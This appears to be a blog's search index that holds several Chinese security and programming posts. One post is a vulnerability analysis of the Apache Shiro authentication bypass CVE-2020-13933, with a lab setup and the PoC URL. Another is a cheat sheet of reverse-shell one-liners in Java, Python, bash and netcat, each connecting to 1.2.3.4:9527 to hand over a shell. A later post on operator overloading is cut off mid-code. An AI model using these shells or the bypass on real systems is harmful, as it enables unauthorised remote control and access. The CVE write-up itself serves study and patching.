<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-13933 漏洞分析</title>
      <link href="/articles/safe/cve-2020-13933-lou-dong-fen-xi/"/>
      <url>/articles/safe/cve-2020-13933-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>Apache Shiro 是一个强大且易用的 Java 安全框架，执行身份验证、授权、密码和会话管理，通常会和 Spring 等框架一起搭配使用来开发 web 应用（请求在到达 Spring 之前，会先经过 Shiro 认证身份）。</p><p>因为某个特定测试场景，Shiro 被白帽子发现了 CVE-2020-11989 身份校验绕过漏洞，漏洞原因在于 Shiro 处理 url 的逻辑与 spring 存在差异。</p><p>对此官方发布了 1.5.3 版本进行修复，但是因为修复补丁存在缺陷， 再次导致了 CVE-2020-13933 身份校验绕过漏洞，官方不得不再次发布了 1.6.0 修复版本。</p><h2 id="漏洞靶场"><a href="#漏洞靶场" class="headerlink" title="漏洞靶场"></a>漏洞靶场</h2><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>环境要求：</p><ul><li>JDK: <code>1.8</code></li><li>spring-boot: <code>2.3.3</code></li><li>apache-shiro: <code>1.5.3 (&lt; 1.6.0)</code></li></ul><p>靶场源码（Maven）： <a href="https://github.com/lyy289065406/CVE-2020-13933">https://github.com/lyy289065406/CVE-2020-13933</a></p><p>靶场关键代码说明：</p><ul><li><a href="https://github.com/lyy289065406/CVE-2020-13933/blob/master/src/main/java/com/exp/cve/ShiroConfig.java"><code>ShiroConfig.java</code></a>： 权限配置， 当请求 <code>/res/*</code> 资源时， 302 跳转到登陆页面进行身份认证</li><li><a href="https://github.com/lyy289065406/CVE-2020-13933/blob/master/src/main/java/com/exp/cve/NameController.java"><code>NameController.java</code></a>：<br>　　□ <code>/res/{name}</code>： 请求名为 <code>name</code> 的的资源（触发身份认证）<br>　　□ <code>/res/</code>： 不请求任何资源（不触发身份认证）</li></ul><blockquote><p>此靶场已收录到 <a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-13933">Vulmon 漏洞情报搜索引擎</a></p></blockquote><h3 id="靶场验证"><a href="#靶场验证" class="headerlink" title="靶场验证"></a>靶场验证</h3><p>不在请求路由中指定资源名称时，不触发身份验证，也无资源返回： <a href="http://127.0.0.1:8080/res/"><code>http://127.0.0.1:8080/res/</code></a></p><p><img src="./01.png"></p><p>在请求路由中指定资源名称时，302 跳转到身份验证页面： <a href="http://127.0.0.1:8080/res/poc"><code>http://127.0.0.1:8080/res/poc</code></a></p><p><img src="./02.png"></p><p>构造特定 PoC 请求指定资源时，不触发身份验证，并返回资源： <a href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> （<code>%3b</code> 是 <code>;</code> 的 URL 编码）</p><p><img src="./03.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="前置漏洞回顾"><a href="#前置漏洞回顾" class="headerlink" title="前置漏洞回顾"></a>前置漏洞回顾</h3><p>通过漏洞背景可知， CVE-2020-13933 是 CVE-2020-11989 的修复补丁不当产生的，因此有必要了解 CVE-2020-11989 的漏洞原因、以及官方补丁的改动位置。</p><p>通过查阅 CVE-2020-11989 现有的<a href="https://xz.aliyun.com/t/7964">漏洞分析报告</a>， 可知 Shiro 为了处理请求路由中形如 <code>;jsessionid=C7E5ED51DCE6B918FD88AE5575C589B6</code> 的参数，会截断 <code>;</code> 后的内容。</p><p>对于 Shiro <code>&lt; 1.5.3</code> 的版本，因为相关逻辑缺陷，若刻意构造路由类似 <code>/;/site/res/name</code> 的请求，会因为匹配错误导致请求路由截断成 <code>/</code>，此时因为没有指定要请求的资源路由，故不会触发 Shiro 的身份认证逻辑。</p><p>因为不需要认证身份，请求 <code>/;/site/res/name</code> 被直接送到 Spring 获取资源，经过 Spring 格式化后（截取根目录后的资源路径），请求路由截断成 <code>/res/name</code>，最终可以成功获取到资源页面，导致 Shiro 权限绕过。</p><p>为了修复这个漏洞， Shiro 发布了 1.5.3 版本，可以对比下官方修复的代码位置：</p><p>【修改前】 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.2-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.2</code></a>:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String contextPath <span class="token operator">=</span> <span class="token function">getContextPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    String requestUri <span class="token operator">=</span> <span class="token function">getRequestUri</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">startsWithIgnoreCase</span><span class="token punctuation">(</span>requestUri<span class="token punctuation">,</span> contextPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Normal case: URI contains context path.</span>        String path <span class="token operator">=</span> requestUri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>contextPath<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">?</span> path <span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Special case: rather unusual.</span>        <span class="token keyword">return</span> requestUri<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【修改后】 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a>:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">normalize</span><span class="token punctuation">(</span><span class="token function">removeSemicolon</span><span class="token punctuation">(</span><span class="token function">getServletPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">getPathInfo</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="当前漏洞分析"><a href="#当前漏洞分析" class="headerlink" title="当前漏洞分析"></a>当前漏洞分析</h3><p>由于官方更新 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 版本后，身份绕过漏洞依旧存在，说明这次代码修复的逻辑仍有不完善的地方。</p><p>为了分析漏洞成因，可以先搭建上述的靶场，然后在 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 的官方修复代码打断点 DEBUG。</p><p>不难发现，修复代码位置在 Shiro 处理请求路由的入口处 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>WebUtils.java</code></a>。为了便于分析，这里对代码做了逐行拆解：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 输入请求路由： http://127.0.0.1:8080/res/%3bpoc</span><span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getPathWithinApplication</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String servletPath <span class="token operator">=</span> <span class="token function">getServletPath</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// servletPath = "/res/;poc" （URL 已解码）</span>    String pathInfo <span class="token operator">=</span> <span class="token function">getPathInfo</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// pathInfo = ""</span>    String path <span class="token operator">=</span> servletPath <span class="token operator">+</span> pathInfo<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// path = "/res/;poc"</span>    path <span class="token operator">=</span> <span class="token function">removeSemicolon</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// path = "/res/"  （截断 ; 后面的内容）</span>    path <span class="token operator">=</span> <span class="token function">normalize</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// path = "/res/"  （标准化 URL： 处理双斜杠、路径穿越）</span>    <span class="token keyword">return</span> path<span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// path = "/res/"</span><span class="token comment" spellcheck="true">//  return normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./04.png"></p><p>很明显，该 PoC 通过 Shiro 处理后， 请求路由 <code>/res/%3bpoc</code> 会变成 <code>/res/</code>， 根据前面靶场的验证结果，因为此路由没有指定资源名称，因此不会触发身份认证，请求会直接送到 Spring 的相关逻辑处理以获取资源。</p><p>此时再 DEBUG 看看 Spring 的处理请求路由的入口代码 <a href="https://github.com/spring-projects/spring-framework/blob/v5.2.5.RELEASE/spring-web/src/main/java/org/springframework/web/util/UrlPathHelper.java"><code>UrlPathHelper.java</code></a> 是如何做的：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 输入请求路由： http://127.0.0.1:8080/res/%3bpoc</span><span class="token keyword">private</span> String <span class="token function">decodeAndCleanUriString</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> String uri<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// uri = "/res/%3bpoc" （URL 未解码）</span>    uri <span class="token operator">=</span> <span class="token function">removeSemicolonContent</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// uri = "/res/%3bpoc"  （截断 ; 后面的内容）</span>    uri <span class="token operator">=</span> <span class="token function">decodeRequestString</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// uri = "/res/;poc"    （URL 字符解码）</span>    uri <span class="token operator">=</span> <span class="token function">getSanitizedPath</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// uri = "/res/;poc"    （标准化 URL： 处理双斜杠）</span>    <span class="token keyword">return</span> uri<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./05.png"></p><p>其实在这里已经可以发现，因为 Shiro 和 Spring 对 URL 的处理逻辑顺序不一致，导致两者得到的路由不同。</p><p>不妨根据这两段代码的逻辑，横向对比输入不同 URL 的情况下最终结果有什么差异。</p><ol><li>当输入为 <a href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/%3bpoc</code></td><td align="center">输入</td><td align="center"><code>/res/%3bpoc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/%3bpoc</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center"><code>;poc</code></td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">返回资源页面</td></tr></tbody></table><ol start="2"><li>当输入为 <a href="http://127.0.0.1:8080/res/;poc">http://127.0.0.1:8080/res/;poc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/;poc</code></td><td align="center">输入</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center">无资源名</td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">无资源返回</td></tr></tbody></table><ol start="3"><li>当输入为 <a href="http://127.0.0.1:8080/res/poc">http://127.0.0.1:8080/res/poc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/poc</code></td><td align="center">输入</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/poc</code></td><td align="center">URL 解码</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/poc</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">资源名</td><td align="center"><code>poc</code></td><td align="center">资源名</td><td align="center"><code>poc</code></td></tr><tr><td align="center">结果</td><td align="center">302 跳转身份认证</td><td align="center">结果</td><td align="center">返回资源页面</td></tr></tbody></table><ol start="4"><li>当输入为 <a href="http://127.0.0.1:8080/res/">http://127.0.0.1:8080/res/</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/</code></td><td align="center">输入</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center">无资源名</td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">无资源返回</td></tr></tbody></table><h3 id="分析结论"><a href="#分析结论" class="headerlink" title="分析结论"></a>分析结论</h3><p>显然除了第 1 种输入，其它 3 种输入的最终输出碰巧都是一致的，而第 1 种输入正是此漏洞的 PoC 。</p><p>造成这种情况的根本原因在于 Shiro 和 Spring 在【URL 截断】和【URL 解码】的操作顺序不一致。</p><p>回顾 URL 的处理过程，总结下来就是：</p><ul><li>URL 进入到 Shiro 时，因为先做 URL 编码 <code>%3b =&gt; ;</code> ，使得路由中的资源名被截断删除</li><li>Shiro 误以为请求路由中无资源名，故该次请求不触发身份认证逻辑</li><li>因不需要身份认证，请求路由被直接转发到 Spring</li><li>Spring 从请求路由中正确截取资源名称，并返回资源页面</li><li>最终导致 Shiro 身份认证被绕过</li></ul><blockquote><p>由于 Shiro 的身份认证是通过判断 URL 匹配来实现的，只要能找到 Shiro 处理 URL 逻辑与 Spring 框架处理 URL 逻辑不一致的地方，都有可能造成身份认证绕过。</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>对于这个漏洞，PoC 亦是 EXP ，只需要把 <code>%3b</code> 放在请求资源路由的最前面，即可绕过认证实现资源访问。</p><p>例如： <code>http://127.0.0.1:8080/res/%3b{资源名}</code> （<code>res</code> 属于站点根目录， 不属于资源路由的一部分）</p><p>当资源路由为后台路径时，攻击者即可绕过认证访问到后台资源。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>从漏洞分析过程可知，只需要调整 Shiro 处理逻辑顺序，使其与 Spring 保持一致即可修复此漏洞。</p><p>但是可能考虑到相同的漏洞已经出现连续了 2 次，所以官方使用了一种更灵活的修复方式：</p><p>不难发现官方补丁 <a href="https://github.com/apache/shiro/blob/shiro-root-1.6.0/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.6.0</code></a> 并没有修复 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 中有关 <code>WebUtils</code> 的问题代码。</p><p>取而代之的是引入了责任链模式，增加了针对 URL 的预处理过滤器 <a href="https://github.com/apache/shiro/blob/shiro-root-1.6.0/web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java"><code>InvalidRequestFilter.java</code></a>，使得 URL 在到进入 Shiro 处理逻辑之前，就通过过滤器对分号、反斜杠和非 ASCII 字符预先进行过滤。尔后若这段修复代码再出现类似漏洞 ，要修复则简单得多。</p><h2 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h2><p>前面已经说过，由于 Shiro 的权限校验是通过判断 url 匹配来实现的，因此一般的挖掘思路是： 如果能找到 Shiro 处理 URL 逻辑与 web 框架处理 URL 逻辑不一致的地方，那么就有可能利用它进行权限绕过。</p><p>但说到底，此漏洞是某个白帽子在做渗透测试试题时偶尔发现的，否则除非是深谙 Shiro 和相关 web 框架的源码、知道两者处理 URL 逻辑的不一致，不然要在正常情况下发现这个漏洞几无可能。</p><p>在不熟悉底层代码逻辑的前提下，可以留意所关注框架的 CVE 修复补丁，通过确认修复内容，推理修复逻辑是否完整合理，也不失是一种捷径。这个漏洞也是这样被发现的，可以说这个漏洞的发现，偶然中带着必然。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《<a href="https://github.com/apache/shiro">Github： Apache Shiro 源码</a>》</li><li>《<a href="https://xz.aliyun.com/t/7964">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</a>》</li><li>《<a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-13933">Vulmon 漏洞情报（CVE-2020-13933）</a>》</li><li>《<a href="https://nosec.org/home/detail/4531.html">【安全通报】Apache Shiro &lt; 1.6.0 权限绕过漏洞（CVE-2020-13933）</a>》</li><li>《<a href="https://www.anquanke.com/post/id/214964">shiro &lt; 1.6.0的认证绕过漏洞分析(CVE-2020-13933)</a>》</li><li>《<a href="https://xz.aliyun.com/t/8223">shiro CVE-2020-11989&amp;CVE-2020-13933复现分析</a>》</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种语言的一句话反弹 shell 命令</title>
      <link href="/articles/safe/ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/"/>
      <url>/articles/safe/ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h2 id="被攻击主机先监听端口"><a href="#被攻击主机先监听端口" class="headerlink" title="被攻击主机先监听端口"></a>被攻击主机先监听端口</h2><p>这是大前提，至于怎么做就看 hacker 的能力了，最简单脚本可以用 nc ：</p><pre class="line-numbers language-bash"><code class="language-bash">nc -lvvp 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="攻击主机连接到服务端口"><a href="#攻击主机连接到服务端口" class="headerlink" title="攻击主机连接到服务端口"></a>攻击主机连接到服务端口</h2><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><pre class="line-numbers language-java"><code class="language-java">Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/1.2.3.4/9527;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",9527));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/1.2.3.4/9527 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/sh 1.2.3.4 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> /tmp/backpipe p/bin/sh 0<span class="token operator">&lt;</span>/tmp/backpipe <span class="token operator">|</span> nc 1.2.3.4 9527 1<span class="token operator">></span>/tmp/backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>威胁情报播报</title>
      <link href="/articles/safe/threat-broadcast/"/>
      <url>/articles/safe/threat-broadcast/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://lyy289065406.github.io/threat-broadcast/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://lyy289065406.github.io/threat-broadcast/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://lyy289065406.github.io/threat-broadcast/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何令永假式成真？</title>
      <link href="/articles/safe/ru-he-ling-yong-jia-shi-cheng-zhen/"/>
      <url>/articles/safe/ru-he-ling-yong-jia-shi-cheng-zhen/</url>
      
        <content type="html"><![CDATA[<p>最近在 <a href="https://stackoverflow.com/questions/48270127/can-a-1-a-2-a-3-ever-evaluate-to-true">Stack Overflow</a> 无意中发现一个挺有意思的问题：</p><blockquote><p>是否可以令永假式 <code>a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3</code> 的值为 <code>true</code> ？**</p></blockquote><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><p>当时看到题干，条件反射就想到了可以通过 C++ 实现，因为 C++ 是可以重写运算符的，其实现代码如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">NumOP</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span><span class="token operator">:</span>        <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token function">NumOP</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>num <span class="token operator">=</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>num <span class="token operator">&lt;=</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    NumOP <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"impossable!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"It's right."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为闲得慌，又萌生出了一个念头：其他语言是否也都可以实现这个表达式呢？</p><p>其实仔细分分析一下题干，要使得表达式成真，可以从两个思路切入：</p><ul><li>(1) 要么 <code>==</code> 的判定逻辑被篡改</li><li>(2) 要么 <code>a</code> 的值要在判断过程中自动变化，此时 <code>a</code> 不可能是基础数据类型（可能是对象、是函数、或是引用）</li></ul><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>因为 Python 和 C++ 同样支持运算符重写，于是类似地可以得到 Python 的实现代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">NumOP</span> <span class="token punctuation">:</span>    